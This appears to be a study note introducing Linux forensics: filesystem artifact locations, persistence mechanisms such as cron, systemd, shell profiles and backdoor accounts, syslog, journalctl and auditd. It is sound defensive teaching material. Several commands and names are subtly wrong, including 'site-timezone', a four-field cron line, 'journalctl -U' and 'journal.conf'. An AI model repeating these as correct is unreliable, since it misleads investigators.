# Introduction to Linux Forensics

## Intro

### Linux Forensics Artifacts

Linux forensics artifacts refer to digital traces, logs, files, and system data left behind on a Linux OS that can be analyzed during investigations to reconstruct events, user activities, or security incidents. These artifacts help you to understand system usage, potential breaches, or malicious actions without providing step-by-step guides on eploitation. Common artifacts are found in logs, user directories, config files, and system processes.

Ubuntu, like most Linux distros, follows the Filesystem Hierarchy Standard, which defines a structured layout for directories and files to ensure consistency across Unix-like systems. This hierarchical tree starts at the root directory and organizes everything in a logical manner, with subdirectories serving specific purposes such as system binaries, user data, configurations, and logs. When conducting a forensic analysis of a Linux system, it's crucial to have a good understanding of the file and directory arrangement on the disk. This knowledge helps investigators efficiently locate important areas and evidence while disregarding less relevant sections.

![intro_linux_forensics1](../../../../images/intro_linux_forensics1.png)

#### /boot/ and /efi/

The `/boot/` and `/efi/` directories store essential files required for booting the system. This includes boot configuration files, kernel parameters, and more. Within these directories, you can also locate both the current and previous kernel versions, along with the initial ramfs, all of which can be subject to examination.

#### /etc/

The `/etc/` directory traditionally serves as the central repository for system-wide configuration files and related data. Most of these files are easily accessible in plaintext. Configuration files often come with associated directories denoted by a `.d` extension, allowing for the inclusion of additional configuration snippets. It's important to note that user-specific configuration files located in a user's `/home/` directory can take precedence over system-wide configurations in `/etc/`.

Here are some of the main forensics artifacts you might find in the `/etc/` directory:

|Purpose|Path|Description|
|---|---|---|
|User Accounts and Passwords|`/etc/passwd`|Contains user account information|
|User Accounts and Passwords|`/etc/shadow`|Stores password hashes (if shadow password system is used).|
|Group Information|`/etc/group`|Contains information about user groups.|
|System Configuration|`/etc/hostname`|Hostname of the system.|
|System Configuration|`/etc/hosts`|Local DNS resolution.|
|System Configuration|`/etc/issue`|Text displayed before login.|
|System Configuration|`/etc/issue.net`|Text displayed before remote login.|
|System Configuration|`/etc/os-release`|Information about the operating system.|
|Network Configuration|`/etc/network/`, `/etc/netplan/`, or `/etc/NetworkManager/`|Contains network configuration files|
|Network Configuration|`/etc/iptables/`, `/etc/iptables.rules`|Stores firewall rules (if used).|
|Service and Software Configuration|`/etc/services`|Lists network services and their associated ports.|
|Service and Software Configuration|`/etc/cron.d/`, `/etc/cron.daily/`|Configuration for scheduled tasks (cron jobs).|
|Service and Software Configuration|`/etc/sudoers`|Configuration for sudo access.|
|System Logs|`/etc/rsyslog.conf` or `/etc/syslog-ng/syslog-ng.conf`|Configuration for system logging.|
|System Logs|`/etc/logrotate.conf`|Log rotation configuration.|
|Security Configuration|`/etc/security/`|Configuration files related to system security.|
|Security Configuration|`/etc/ssh/sshd_config`|SSH server configuration.|
|Security Configuration|`/etc/pam.d/`|Pluggable Authentication Modules configuration.|
|Package Management|`/etc/apt/`|Configuration for the APT package manager (Debian/Ubuntu).|
|Package Management|`/etc/yum.conf` and `/etc/yum.repos.d/`|Configuration for the YUM package manager (RHEL/CentOS).|
|Hostname Resolution|`/etc/resolv.conf`|DNS resolver configuration.|
|Web Server Configuration|`/etc/apache2/`, `/etc/nginx/`|Standard web server configuration directories.|
|Database Configuration|`/etc/mysql/`|Configuration files for MySQL or MariaDB.|
|Database Configuration|`/etc/postgresql/`|Configuration for PostgreSQL.|
|Shell Configuration|`~/.bashrc`, `~/.bash_profile`, `~/.zshrc`, `/etc`|User-specific shell configuration files can be found in the user's home directory while global shell configurations in `/etc`.|
|User-Specific Configuration|`/etc/skel/`|Contains default files and directories for new user accounts.|

#### /tmp/

The `/tmp/` directory is designated for temporary storage of files. In certain Linux distros, the contents might be stored in the system's RAM using the tmpfs virtual memory file system. In forensic images, systems employing tmpfs to mount `/tmp/` will probably appear empty.

#### /run/

The `/run` directory is a tmpfs-mounted directory residing in RAM and will likely be empty on a forensic image. On a running system, this directory contains runtime information like PID and lock files, systemd runtime configuration, and more. There may be references to files and directories in `/run/` found in logs or configuration files.

#### /home/ and /root/

The `/home/` directory is the default location for user home directories. A user's home directory contains files the user created or downloaded, including configuration, cache, data, documents, media, desktop contents, and other files the user owns. The root user's home directory is typically `/root/` of the root filesystem. These home directories are of significant interest to forensic investigators because they provide information about a system's human users. The creation (_birth_) timestampt of a user's home directory my indicate when the user account was first added.

Here are the main artifacts you can find in the `/home/` directory:

|Purpose|Path|Description|
|---|---|---|
|User Documents and Files|`/home/<username>`|The user's personal files, including documents, images, videos, and other data, are typically stored in subdirectories.|
|Browsing Artifacts|`~/.mozilla/` and `~/.config/google-chrome/`|Directories of Firefox and Chrome web browsers user profiles. These directories may contain browsing history, bookmarks, and cache files.|
|Browsing Cache Files|`~/.cache`|Temporary local copies of web resources like images, scripts, and stylesheets that browsers store to speed up page loading on future visits.|
|Hidden Directories|`~/.<directory-name>` like `~/.config`, `~/.ssh`|Many configuration files and directories start with a dot and these often contain settings and preferences for various applications.|
|Desktop Environment Settings|`~/.config/`|User-specific settings for desktop environments (e.g., GNOME, KDE) can be found in this directory.|
|Shell History|`~/.bash_history`|The command history for a user's shell (e.g., Bash) is stored in this file or a similar location.|
|Email clients|`~/.thunderbird/`|Thunderbird email client data storage location.|
|Messaging application|`~/.config`|Messaging data may be stored in this directory or application-specific directories.|
|Desktop Environment Logs|`~/.local/share` or `~/.config`|Logs and usage data for the user's desktop environment can be found in these directories.|
|Access and Modification Timestamps|`/home/`|Timestamps associated with files and directories in the home directory can indicate when files were created, modified, or accessed. These timestamps are inherent to the file system.|
|Recently Used Files|`~/.local/share/recently-used.xbel`|Lists of recently accessed or similar files.|
|SSH and PGP Keys|`~/.ssh/`, `~/.gnupg/`|SSH and PGP keys can be found in these directories.|
|System Logs|`~/.local`|Some system logs and logs from installed applications may be stored in this directory or other hidden directories.|
|Downloaded Files|`/home/<username>/Downloads`|Users often download files to their directory.|
|Cloud Storage Sync|`~/.dropbox` or `~/.config/google-drive-ocamlfuse`|If a user uses cloud storage services like Dropbox or Google Drive, synchronization data and configuration settings can be found in these directories.|

#### /bin/, /sbin/, /usr/bin/, and /usr/sbin/

The standard locations for executable programs are `/bin/`, `/sbin/`, `/usr/bin/`, and `/usr/sbin/`. These directories were originally intended to separate groups of programs for users, administrators, the boot process, or for separately mounted filesystems. Today, `/bin/`and `/sbin/` are often symlinked to their corresponding directory in `/usr/`, and in some cases `/bin/`, `/sbin/`, and `/usr/sbin/` are symlinked to a single `/usr/bin` directory containing all programs.

#### /lib/ and /usr/lib/

The `/lib/` directory is generally symlinked to `/usr/lib/` on most Linux systems today. This includes shared library code, kernel modules, support for programming environments, and more. The `/lib` directory also contains the default configuration files for many software packages.

#### /usr/

The `/usr/` directory contains the bulk of the system's static read-only data. This includes binaries, libraries, documentation, and more. Most Linux System will symlink `/bin/`, `/sbin/`, and `/lib/` to their equivalents in the `/usr/` subdirectory. Files located in here that are not part of any installed package may be of forensic interest because they were added outside the normal software installation process. These might be manually installed files by a user with root access, or unauthorized files placed by a malicious actor.

#### /var/

The `/var/` directory contains changing system data and usually persistent across reboots. The subdirectories below `/var/` are especially interesting from a forensics perspective because they contain logs, cache, historical data, persistent temporary files, the mail and printing subsystems, and much more.

The main forensics artifacts of the `/var/` directory are:

|Purpose|Path|Description|
|---|---|---|
|System Logs|`/var/log/`|This directory contains system logs that record various system events and activities, including login attempts, service startups, and system errors. Common log files include `/var/log/auth.log`, `/var/log/syslog`, and `/var/log/messages`.|
|Package Management Logs|`/var/log/dpkg.log` or `/var/log/yum.log`|These logs track package installations, updates, and removals, which can provide information about software changes on the system.|
|Print Spooler Files|`/var/spool/cups/`|The Common Unix Printing System (CUPS) stores print job information in this directory, potentially revealing print job histories.|
|Mail Server Data|`/var/mail/` or `/var/spool/mail/`|Mailboxes and email-related artifacts are often stored here.|
|Database Files|`/var/lib/`|Databases like MySQL or PostgreSQL store their data files and logs.|
|Temporary Files|`/var/tmp/` and `/var/run/`|Temporary files and directories can contain artifacts such as unclean shutdown logs or remnants of executed processes.|
|Cron and Scheduled Tasks|`/var/spool/cron/crontabs/`|Information about scheduled tasks can be found in these files, which may include scripts and commands executed by cron jobs.|
|Web Server Logs|`/var/log/apache2/` or `/var/log/nginx/`|If a web server is installed, access and error logs can provide insights into web activity.|
|Printer Logs|`/var/log/cups/`|Printer-related logs.|
|DHCP and Network Logs|`/var/log/`|DHCP client and server logs.|
|Security and Authentication Data|`/var/log/secure` or `/var/log/auth.log`|These logs record authentication and security-related events, including login attempts and SSH connections.|
|Package Cache|`/var/cache/apt/archives/` or `/var/cache/yum/`|Package cache may contain downloaded package files, which could be of forensic interest.|
|System State Information|`/var/lib/misc/`|This directory may contain system state information, including files related to networking and hardware.|
|Session Information|`/var/run/utmp` and `/var/log/wtmp`|These files track user login and logout sessions.|
|Kernel Logs|`/var/log/kern.log` or `/var/log/dmesg`|Kernel-related logs.|
|Software Update Information|`/var/lib/update-notifier/package-data-downloads/`|This directory may contain data related to software updates.|

#### /dev/, /sys/, and /proc/

Linux has several other tmpfs and pseudo-filesystems that appear to contain files when the system is running, which include `/dev/`, `/sys/`, and `/proc/`. These directories provide representations of devices or kernel data structures but the contents don't actually exist on a normal filesystem. When examining a forensic image, these directories will likely be empty.

#### /media/

The `/media/` directory is inteded to hold dynamically created mount points for mounting external removable storage, such as CD-ROMs or USB drives. When examining a forensic image, this directory will likely be empty. References to `/media/` in logs, filesystem metadata, or other persistent data may provide information about user-attached external storage devices.

#### /opt/

The `/opt/` directory contains add-on packages, which typically are grouped by vendor name or package name. These packages may create a self-contained directory tree to organize their own files.

#### /lost+found/

A `/lost+found/` directory may exist on the root of every filesystem. If a filesystem repair is run and a file is found without a parent directory, that file is placed in the `/lost+found/` directory, where it can be recovered. Such files don't have their original names because the directory that contained the filename is unknown or missing.

> [!INFO]
> https://digitalforensics.ch/linux/
> https://github.com/orlikoski/CyLR
> https://github.com/ForensicArtifacts/artifacts/blob/main/artifacts/data/linux.yaml

### Linux Persistence

Linux persistence techniques refer to methods used by threats, such as malware or attackers, to maintain long-term access to a compromised Linux system. These mechanisms ensure that malicious code or access survives events like reboots, logouts, or system updates. In a forensics context, understanding these helps investigators identify artifacts, reconstruct incidents, and detect anomalies through logs, file modifications, and process behaviors. Techniques often align with the MITRE ATT&CK framework's Persistence tactic ([TA003](https://attack.mitre.org/tactics/TA0003/)), which defines ways adversaries retain footholds via access, actions, or configurations. Common categories include boot/logon scripts, scheduled tasks, service modifications, user account manipulations, and event-triggered executions.

Below is an outline of key techniques in a table format, drawing from established sources for high-level descriptions and detection approaches. Variations exist across distros, but many leverage standard components like systemd, cron, or shell configs.

![intro_linux_forensics2](../../../../images/intro_linux_forensics2.png)

It illustrates various mechanisms for maintaining access in Linux environments, particularly those using systemd as the init system. It begins at the central node representing the system init process and branches out into interconnected components covering system-wide and user-specific elements, such as generators, services, schedulers, daemons, accounts, authentication methods, and login shells, with additional nodes for specialized areas like web servers, rootkits, and infected software. This diagram is especially useful to hunt down such persistence mechanisms that are used in the wild.

#### User Manipulation

Users and groups configs are located here:

- `/etc/gshadow`
- `/etc/shadow`
- `/etc/passwd`
- `/etc/group`

```bash
linuxforensics@ubuntu:~$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/var/run/dbus:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
<SNIP>
```

Attackers might add new users, modify passwords, or elevate privileges by editing these files. For instance, a new entry in `/etc/passwd` could indicate a backdoor account. In forensics, compare timestamps and contents against baselines to spot anomalies.

#### Init Scripts

Init Scripts are configuration files that are used by Linux initialization systems to manage the startup, shutdown, and supervision of services and processes during the boot process. Those startup scripts are located in `/etc/init.d` and symbolic links in various runlevel directories like `/etc/rc3.d/` to start or stop services.

`Upstart` is used in some older Linux distros like Ubuntu 14.04 and its configuration files are located in `/etc/init/`.

#### Systemd

Systemd is the modern init system in most Linux distros. It manages services using unit files, usually located in `/lib/systemd/system/` or `/etc/systemd/system/`. You can use `systemctl` to enable and start services.

#### Cron Jobs

You can use cron jobs to schedule tasks at specific times or intervals. Entries in crontab files can be used to start scripts or commands.

For example, you can retrieve crontab data using `crontab -l`:

```bash
linuxforensics@ubuntu:~$ crontab -l

0 2 * * /bin/sh backup.sh
```

#### SSH Authorized Keys

The authorized_keys file, located at `~/.ssh/authorized_keys`, specifies the SSH keys that can be used to log in to the user account for which the file is configured.

#### Startup Applications

Many Linux dekstop environments, such as GNOME and KDE, allow users to configure startup applications through graphical settings. These are typically user-specific and can be configured through the desktop's settings.

#### /etc/rc.local

This is a traditional method for running custom scripts at boot time. The `/etc/rc.local` script is executed at the end of the system's initialization.

#### Shell Profile Files

You can add commands to shell profile files like `~/.bashrc`, `~/.bash_profile`, or `~/.profile`. These commands will be executed whenever a user logs in.

#### Autostart Directories

Some desktop environments use autostart directories to launch user-specific applications. For example, in GNOME, you can place .desktop files in `~/.config/autostart/`.

#### Service Management Tools

Tools like `chconfig` or `update-rc.d` can be used to manage services and their runlevel configurations.

#### User Session Startup Scripts

In some cases, you may want to execute scripts or programs at the start of a user session. You can achieve this by adding commands to the appropriate shell startup files, such as `~/.xprofile`, or by using the desktop environment's session manager.

## Forensics Arsenal

### Linux Logging

There are several notable mechanisms of logging in Linux:

- **Syslog**: Syslog is a standard logging protocol used to collect and send log messages within a network. Linux systems often use syslog to store log data in various log files, typically located in the `/var/log` directory. Common log files include `/var/log/messages`, `/var/log/auth.log`, and `/var/log/syslog`. These logs can provide valuable information about system and application activities, such as failed login attempts or service startups.
- **Systemd Journal**: Systemd, a common init system on many Linux distros, uses the systemd journal for logging. Journalctl is the command-line tool for querying and examining these logs. The journal provides structured and more comprehensive information compared to traditional flat text log files, including metadata like timestamps, process IDs, and severity levels.
- **Auditd**: The Linux Audit framework allows for detailed monitoring of system activities, including file access, process creation, and user authentication. Auditd is the user-space component, and it logs its data to `/var/log/audit/audit.log`. This is a powerful tool for tracking changes and potential security incidents, often used in compliance-heavy environments.
- **SysmonForLinux**: This is a tool that monitors and logs system activity, including processes, network connections and file system writes to what Sysmon for Windows does. SysfmonForLinux logs events into `/var/log/syslog` using XML format. It's particularly useful for endpoint detection and response (_EDR_) scenarios.

#### Syslog

The traditional logging system on Unix and Unix-like OS, such as Linux, is syslog. Syslog enables the separation of software that generates log messages from the systems that store, process, or forward those messages. In Linux, Syslog is implemented through daemons like syslogd, rsyslog, or syslog-ng, which handle the collection and management of logs. It's essentially a way for the system to record events, errors, and other important information in a structured manner. While traditional Syslog refers to the protocol defined in [RFC 5424](https://datatracker.ietf.org/doc/html/rfc5424), in Linux contexts, it often encompasses the entire logging ecosystem, including the daemon and configuration files. Note that modern Linux distros may integrate or replace parts of Syslog with tools like Systemd Journal, but Syslog remains widely used for compatibility and flexibility.

Syslog operates by having applications, services, or the kernel generate log messages that are sent to daemon like rsyslog or syslog-ng via local sockets, the logger command, or network protocols. These messages follow a standardized format including a priority code, a header with timestamp and hostname, and the actual content. The daemon processes incoming messages according to rules defined in configuration files, where selectors match facility.priority patterns to actions like writing to specific log files in `/var/log`, forwarding to another server for centralized logging, discarding, or piping to external programs. Logs are stored persistently, with tools like logrotate handling rotation and compression to manage disk space, ensuring efficient, categorized recording of system events for troubleshooting, monitoring, and auditing while supporting both local and networked environments.

Syslog is typically implemented as a daemon that listens for log messages from multiple sources, such as packets arriving over network sockets, local named pipes, or syslog library calls.

Here's a breakdown of key components:

|Component|Description|
|---|---|
|Log originator|Programs with syslog support kernel messages|
|Config files location|`/etc/rsyslogd.conf /etc/rsyslogd.d/conf /etc/syslog-ng/`|
|Daemon|`/usr/sbin/rsyslogd` (Service started by systemd)|
|Network log host|UDP port 514 (Configured with @host)|
|Local logfiles|`/var/log/*` (By facility and severity)|

For example, to view recent syslog entries on a Debian-based system:

```bash
d41y@htb[/htb]$ tail -n 10 /var/log/syslog

Feb 26 15:45:01 ubuntu CRON[12345]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Feb 26 15:46:12 ubuntu systemd[1]: Started Time & Date Service.
Feb 26 15:47:23 ubuntu kernel: [ 1234.567890] eth0: link up
Feb 26 15:48:34 ubuntu sshd[67890]: Accepted publickey for john from 10.10.16.14 port 22 ssh2
Feb 26 15:49:45 ubuntu sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/apt update
Feb 26 15:50:56 ubuntu apt[23456]: Updating package lists...
Feb 26 15:51:07 ubuntu systemd-logind[789]: New session 1 of user john.
Feb 26 15:52:18 ubuntu NetworkManager[890]: <info>  [1234567890.123] dhcp4 (eth0): state changed unknown -> bound
Feb 26 15:53:29 ubuntu rsyslogd: [origin software="rsyslogd" swVersion="8.32.0" x-pid="7785" x-info="<https://www.rsyslog.com>"] rsyslogd was HUPed
Feb 26 15:54:40 ubuntu anacron[34567]: Job `cron.daily' terminated
```

This output can reveal patterns like unauthorized access or cron job executions. In forensics, you often use tools like grep to filter for specific events.

#### Extending to Additional Mechanisms

There are also some advanced or specialized logging options commonly encountered in Linux forensics:

1. **Kernel Ring Buffer (_dmesg_)**: This logs kernel messages, such as hardware detections or driver issues, stored in a circular buffer. Access it via the `dmesg` command or `/var/log/dmesg` on boot. Useful for investigating boot-time anomalies or device attachments.
2. **Application-Specific Logs**: Many services maintain their own logs, like Apache or MySQL. These provide granular details on web traffic or database queries, often rotated via logrotate in `/etc/logrotate.d/`.
3. **ELK Stack or Splunk Integration**: In enterprise setups, logs are forwarded to centralized systems like ES, Logstash, Kibana, or Splunk for aggregation and analysis. Check `/etc/rsyslog.d/` for forwarding configs to detect exfiltration or monitoring setups.

For instance, to check kernel logs, you can use the following command:

```bash
d41y@htb[/htb]$ dmesg | tail -n 5

[12345.678901] usb 1-1: new high-speed USB device number 2 using xhci_hcd
[12345.789012] usb 1-1: New USB device found, idVendor=0781, idProduct=5581, bcdDevice= 1.00
[12345.890123] usb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3
[12345.901234] usb 1-1: Product: Ultra
[12345.912345] usb-storage 1-1:1.0: USB Mass Storage device detected
```

When investigating logs, always preserve originals by copying to a forensic image. Use tools like `log2timeline` from Plaso to create super timelines correlating logs with file timestamps. Rotating and compressing logs can hide older events, so check archived files in `/var/logs/*.gz`.

### Systemd Journal

Systemd is a comprehensive suite of software tools that serve as the system and service manager for modern Linux distros, acting as the init system to bootstrap the user space and manage subsequent processes. For initializing and managing the Linux system after the kernel boots, systemd offers features like:

- Service Management
- Resource Control
- Hardware and Device Management
- Timers and Scheduling
- Logging Integration
- System State Management

It replaces older init systems like SysVinit or Upstart and is the default in distros such as Ubuntu, Fedora, Debian, and Arch Linux. It encompasses a wide range of components, including daemons for handling services, devices, mounts, timers, and logging, providing a unified framework for system initialization and management.

#### Overview

The shortcomings of the aging syslog system have resulted in a number of security and availability enhancements. Many of these enhancements have been added to existing syslog daemons as non-standard features and never gained widespread use among Linux distros. The systemd journal was developed from scratch as an alternative logging system with additional features missing from syslog, such as structured logging, forward-secure sealing, and efficient querying. Therefore, systemd-journal is the logging component of systemd, functioning as a system service daemon that collects, processes, and stores loggin data from the kernel, system services, applications, and other sources. It maintains structured, indexed journals in a binary format, which is more efficient than traditional text-based logs, and it conforms to standards like the Syslog protocol for message classification by priority and facility. The terms "journald" and "systemd-journald" are used interchangeably to describe this daemon.

Here's a breakdown of its key components:

|Component|escription|
|---|---|
|`Log originator`|All of the messages produced by the kernel, initrd, services, etc.|
|`Config files location`|`/etc/systemd/journald.conf`|
|`Daemon`|`systemd-journald` (Service managed by systemd)|
|`Local audit log`|`/var/log/journal/* /run/log/journal/*`|
|`Tool used to search`|`journalctl`|

One of the benefits of using a binary journal for logging is the ability to view log records in local time and in UTC if you want. By default, systemd will display results in local time.

```bash
linuxforensics@ubuntu:~$ sudo timedatectl site-timezone UTC
```

You can run the `journalctl` utility to show initial results:

```bash
linuxforensics@ubuntu:~$ journalctl

Oct 23 10:40:20 ubuntu kernel: Linux version 5.15.0-87-generic (buildd@bos03-amd64-016) (gcc (Ubuntu 9.4.0-1ubuntu1~20.0>
Oct 23 10:40:20 ubuntu kernel: Command line: BOOT_IMAGE=/boot/vmlinuz-5.15.0-87-generic root=UUID=4af306c1-ff64-48b1-944>
Oct 23 10:40:20 ubuntu kernel: KERNEL supported cpus:
Oct 23 10:40:20 ubuntu kernel:   Intel GenuineIntel
Oct 23 10:40:20 ubuntu kernel:   AMD AuthenticAMD
Oct 23 10:40:20 ubuntu kernel:   Hygon HygonGenuine
Oct 23 10:40:20 ubuntu kernel:   Centaur CentaurHauls
Oct 23 10:40:20 ubuntu kernel:   zhaoxin   Shanghai
Oct 23 10:40:20 ubuntu kernel: Disabled fast string operations
Oct 23 10:40:20 ubuntu kernel: BIOS-provided physical RAM map:
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009e7ff] usable
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x000000000009e800-0x000000000009ffff] reserved
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x00000000000dc000-0x00000000000fffff] reserved
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x0000000000100000-0x000000007fedffff] usable
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x000000007fee0000-0x000000007fefefff] ACPI data
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x000000007feff000-0x000000007fefffff] ACPI NVS
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x000000007ff00000-0x000000007fffffff] usable
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x00000000f0000000-0x00000000f7ffffff] reserved
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec0ffff] reserved
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reserved
Oct 23 10:40:20 ubuntu kernel: BIOS-e820: [mem 0x00000000fffe0000-0x00000000ffffffff] reserved
Oct 23 10:40:20 ubuntu kernel: NX (Execute Disable) protection: active
Oct 23 10:40:20 ubuntu kernel: SMBIOS 2.7 present.
<SNIP>
```

#### Journalctl

... is a command-line utility that is using systemd that allows you to query, view, and manage logs collected by the systemd-journald daemon, providing a centralized interface to access structured binary journal files containing detailed system events, kernel messages, service outputs, and metadata like timestamps, priorities, and process IDs.

|Command|Description|
|---|---|
|`journalctl --utc`|Display timestamps in UTC|
|`journalctl -b`|Display logs from current boot|
|`journalctl --list-boots`|List previous boots|
|`journalctl -b -1`|See journal from the previous boot (you can use boot ID instead -1)|
|`journalctl --utc -D /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c`|Use external journal folder to retrieve results from|
|`journalctl --utc --since "2023-10-15 18:00:00" --until "2023-10-15 19:00:00" -D /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c`|Use time windows for your logs (format: YYYY-MM-DD HH:MM:SS)|
|`journalctl --utc --since "2023-10-15 18:00:00" --until "2023-10-15 19:00:00" -D /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/ -u httpd.service`|Filter results by unit (http.service as an example)|
|`journalctl --utc --since "2023-10-15 18:00:00" --until "2023-10-15 19:00:00" -D /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/ -u httpd.service _PID=27804`|Filter results by Process ID (PID)|
|`journalctl /usr/bin/bash`|Filter results by executable|
|`journalctl -p err --no-pager`|Filter results by priority (You can use either the priority name or its corresponding numeric value) • 0: emerg • 1: alert • 2: crit • 3: err • 4: warning • 5: notice • 6: info • 7: debug|
|`journalctl -o json-pretty`|Output journalctl in json or any other formats: • cat: Displays only the message field itself. • export: A binary format suitable for transferring or backing up. • json: Standard JSON with one entry per line. • json-pretty: JSON formatted for better human-readability • json-sse: JSON formatted output wrapped to make add server-sent event compatible • short: The default syslog style output • short-iso: The default format augmented to show ISO 8601 wallclock timestamps. • short-monotonic: The default format with monotonic timestamps. • short-precise: The default format with microsecond precision • verbose: Shows every journal field available for the entry, including those usually hidden internally.|

You can sue `man systemd.journal-fields` to identify fields that can be used for search:

|Trusted Journal Fields|Description|
|---|---|
|`_PID`, `_UID`, `_GID`|The PID, UID, and group ID of the process the journal entry originates from, formatted as a decimal string. Note that entries obtained via "stdout" or "stderr" of forked processes will contain credentials valid for a parent process (that initiated the connection to systemd-journal).|
|`_COMM`, `_EXE`, `_CMDLINE`|The name, executable path, and command line of the process the journal entry originates from.|
|`_CAP_EFFECTIVE=`|The effective capabilities(7) of the process the journal entry originates from.|
|`_AUDIT_SESSION`, `_AUDIT_LOGINUID`|The session and login UID of the process the journal entry originates from, as maintained by the kernel audit subsystem.|
|`_SYSTEMD_CGROUP=`, `_SYSTEMD_SLICE=`, `_SYSTEMD_UNIT=`, `_SYSTEMD_USER_UNIT=`|The control group path in session, systemd hierarchy owner UID, the systemd slice unit name, the unit name in the systemd user manager (if any), the owner ID (if any) of the systemd user unit or systemd session (if any), and the owner UID of the systemd user.|
|`_SELINUX_CONTEXT=`|The SELinux security context (label) of the process the journal entry originates from.|

Usage example:

```bash
d41y@htb[/htb]$ journalctl --utc --since "2023-10-15 18:00:00" --until "2023-10-15 19:00:00" -D /home/linuxforensics/Desktop/cases/scenario1/collection/uploads/auto/var/log/journal/894062f9af204645a289e8016977fe6c/ -u httpd.service _PID=27804 -o json-pretty

{
        "__CURSOR" : "s=abcdef1234567890;i=1234;b=567890abcdef1234;m=123456789;t=5f1234567890a;x=bcdef1234567890",
        "__REALTIME_TIMESTAMP" : "1697383200000000",
        "__MONOTONIC_TIMESTAMP" : "123456789",
        "_BOOT_ID" : "567890abcdef1234",
        "PRIORITY" : "6",
        "_UID" : "0",
        "_GID" : "0",
        "_SYSTEMD_SLICE" : "system.slice",
        "_MACHINE_ID" : "894062f9af204645a289e8016977fe6c",
        "_HOSTNAME" : "ubuntu",
        "SYSLOG_FACILITY" : "3",
        "SYSLOG_IDENTIFIER" : "httpd",
        "MESSAGE" : "Server started successfully",
        "_TRANSPORT" : "journal",
        "_PID" : "27804",
        "_COMM" : "httpd",
        "_EXE" : "/usr/sbin/httpd",
        "_CMDLINE" : "/usr/sbin/httpd -DFOREGROUND",
        "_CAP_EFFECTIVE" : "0",
        "_SYSTEMD_CGROUP" : "/system.slice/httpd.service",
        "_SYSTEMD_UNIT" : "httpd.service",
        "_SYSTEMD_INVOCATION_ID" : "12345678-90ab-cdef-1234-567890abcdef"
}
<SNIP>
```

To enhance forensic analysis, consider exporting journals for offline review. Use `journalctl -o export > journal.export` to create a binary export file, which can be imported elsewhere with `journalctl --import journal.export`. For persistence, configure `/etc/systemd/journal.conf` to set `Storage=persistent`, ensuring logs survive reboots in `/var/log/journal/`. In investigations, combine filters for targeted searches, like `journalctl -U ssh.service -p err` to spot SSH errors. Tools like `journalctl --vacuum-time=2weeks` can clean old entries, but in forensics, disable this to preserve data. For remote journals, enable forwarding with SystemLogSocket in `journald.conf`, sending to a central server for aggregation.

### Auditd

... is a powerful auditing framework that goes beyond standard logging by capturing granular, security-relevant events at the kernel level, making it invaluable for detecting intrusions, compliance violations, or unauthorized changes. In incident response, Auditd logs can reveal file tampering, syscall abuses, or user modifications that might evade other mechanisms, allowing you to reconstruct attack paths with precision. It operates by starting as a service and communicating with the kernel's audit subsystem through a netlink socket to receive event messages. It applies predefined audit rules to filter and log relevant events, writing them in a structured format to `/var/log/audit/audit.log`, with features like log rotation and buffering to hanlde high volumes. Configuration is managed via `/etc/audit/audit.conf`, and it can be controlled with tools like auditctl for runtime adjustments. If the log fills up, it can trigger actions like halting the system for security.

#### Overview

The Linux Audit subsystem provides a secure logging framework that is used to capture and record security relevant events. Linux auditing is a kernel feature that generates an audit trail based on a set of rules. It has similarities to other logging mechanisms, but is more flexible, granular, and able to log file access and system calls. The `auditctl` program loads rules into the kernel, and the auditd daemon writes the audit records to disk.

A breakdown of its key components:

|Component|Description|
|---|---|
|Audit rules|`/etc/audit/audit.rules /etc/audit/rules.d/*.rules`|
|Config files location|`/etc/audit/auditd.conf`|
|Daemon|`/usr/sbin/auditd`|
|Local audit log|`/var/log/audit/audit.log`|
|Tool used to configure rules|`auditctl`, augenrules reads in the `/etc/audit/rules.d/` and compiles them into an `audit.rules` file.|
